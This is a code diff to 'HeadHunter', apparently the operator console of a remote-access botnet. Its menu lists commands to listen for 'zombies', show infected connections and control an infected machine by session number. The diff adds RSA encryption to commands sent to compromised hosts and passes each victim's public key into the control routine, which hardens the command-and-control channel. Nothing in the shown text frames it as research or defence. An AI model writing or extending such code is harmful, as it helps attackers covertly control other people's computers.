@@ -5,8 +5,10 @@
 
 
 
+import readline
 from src import server
 import sys 
+import rsa
 
 print(
 '''
@@ -29,6 +31,7 @@ type \'help\' for available commands
 ''')
 
 
+readline.set_auto_history(True)
 while True:
 	command = input("HeadHunter/> ").lower().split(" ")
 	print(" ")
@@ -54,8 +57,8 @@ while True:
 help                      --          displays this menu
 listen <LHOST> <LPORT>    --	      starts listening for zombies on the specified local address and port
 show connections	  -- 	      displays active zombie connections by address and source port
-control <session>         --          controls an infected zombie by session number
 exit                      --          exits the headhunter interactive shell
+control <session>         --          controls an infected zombie by session number
 
 		''')
 
@@ -63,10 +66,11 @@ exit                      --          exits the headhunter interactive shell
 		
 		try:
 			zombie = server.c[int(subcmd)-1]
+			zombiepubkey = server.public_partner[int(subcmd)-1]
 			hello = "\n"
-			zombie.send(hello.encode())
+			zombie.send(rsa.encrypt(hello.encode(), zombiepubkey))
 			print("Entering control mode for zombie " + subcmd + " on address " + str(zombie.getpeername()))
-			server.control(zombie)	
+			server.control(zombie, zombiepubkey)	
 		except OSError:
 			print("Zombie is currently disconnected on selected session")
 
